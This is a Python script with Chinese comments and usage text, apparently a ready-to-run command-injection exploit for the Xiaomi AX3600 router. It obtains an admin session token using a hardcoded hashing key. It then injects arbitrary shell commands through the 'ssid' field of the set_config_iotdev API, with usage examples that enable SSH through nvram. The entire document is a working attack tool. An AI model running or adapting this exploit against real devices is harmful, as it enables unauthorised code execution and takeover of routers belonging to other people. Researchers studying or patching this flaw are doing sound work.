#!/usr/bin/env python3
"""
AX3600 通用命令注入工具 (set_config_iotdev exploit)

用法:
    # 登录并注入单条命令
    python3 rce.py --pwd 12345678 'cat /proc/version'

    # 注入多条命令
    python3 rce.py --pwd 12345678 \
      'nvram set ssh_en=1' \
      'nvram commit'

    # 仅获取 stok
    python3 rce.py --stok-only --pwd 12345678

    # 使用已有 stok
    python3 rce.py --stok STOK 'ls /etc/init.d/'
"""

import hashlib
import random
import time
import urllib.request
import urllib.parse
import json
import sys
import argparse

KEY = "a2ffa5c9be07488bbb04a3a47d3c5f6a"


def sha1(s: str) -> str:
    return hashlib.sha1(s.encode('utf-8')).hexdigest()


def nonce() -> str:
    return f"0__{int(time.time())}_{random.randint(0, 9999)}"


def login(ip: str, pwd: str) -> str:
    n = nonce()
    pw_hash = sha1(n + sha1(pwd + KEY))
    url = (f"http://{ip}/cgi-bin/luci/api/xqsystem/login"
           f"?username=admin&logtype=2&nonce={n}"
           f"&password={pw_hash}&init=0")
    r = json.loads(urllib.request.urlopen(url, timeout=10).read())
    if r.get('code') != 0:
        raise Exception(f"登录失败: {r}")
    return r['token']


def inject(ip: str, stok: str, cmd: str) -> dict:
    """通过 set_config_iotdev 注入单条命令（多条用 ; 拼接）"""
    ssid = "-h;" + cmd + ";"
    params = urllib.parse.urlencode({
        'bssid': 'Xiaomi',
        'user_id': 'longdike',
        'ssid': ssid,
    })
    url = (f"http://{ip}/cgi-bin/luci/;stok={stok}"
           f"/api/misystem/set_config_iotdev?{params}")
    try:
        r = json.loads(urllib.request.urlopen(url, timeout=30).read())
        return r
    except Exception as e:
        return {"code": 0, "_note": str(e)}


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='AX3600 通用命令注入',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            '示例:\n'
            '  python3 rce.py --pwd 12345678 "cat /proc/version"\n'
            '  python3 rce.py --stok STOK "nvram show | grep ssh"\n'
            '  python3 rce.py --stok-only --pwd 12345678\n'
        ))
    parser.add_argument('cmds', nargs='*', help='要执行的命令')
    parser.add_argument('--ip', default='192.168.31.1')
    parser.add_argument('--pwd', help='管理密码')
    parser.add_argument('--stok', help='已有 stok')
    parser.add_argument('--stok-only', action='store_true', help='仅获取 stok')
    args = parser.parse_args()

    stok = args.stok
    if not stok:
        if not args.pwd:
            args.pwd = input('管理密码: ')
        try:
            stok = login(args.ip, args.pwd)
        except Exception as e:
            print(json.dumps({"error": f"登录失败: {e}"}))
            sys.exit(1)

    if args.stok_only:
        print(json.dumps({"stok": stok}))
        sys.exit(0)

    if not args.cmds:
        print(json.dumps({"stok": stok, "msg": "未输入命令（加 --stok-only 仅获取 stok）"},
                         ensure_ascii=False))
        sys.exit(0)

    # 多条命令用 ; 拼接
    full_cmd = " ; ".join(args.cmds)
    r = inject(args.ip, stok, full_cmd)

    out = {
        "stok": stok,
        "command": full_cmd,
        "inject_ok": r.get('code') == 0,
        "response": r,
    }
    print(json.dumps(out, ensure_ascii=False))
    if not out["inject_ok"]:
        sys.exit(1)
